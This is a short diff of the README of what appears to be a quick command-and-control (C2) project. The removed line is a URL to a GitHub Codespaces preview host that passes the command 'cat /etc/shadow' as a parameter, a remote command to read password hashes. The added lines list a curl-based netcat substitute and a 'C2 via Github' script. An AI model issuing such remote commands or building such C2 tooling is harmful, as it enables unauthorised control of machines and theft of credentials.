@@ -1,3 +1,7 @@
-# c2
+# Quick'n Dirty C2
 
-https://secureinfo42-sturdy-eureka-wr47qgqr4pr2gj7w-8888.preview.app.github.dev/?cmd=cat%20/etc/shadow
+Script | Description
+------ | -----------
+two_lines_curl | No netcat ? Try this :)
+cmd | C2 via Github
+
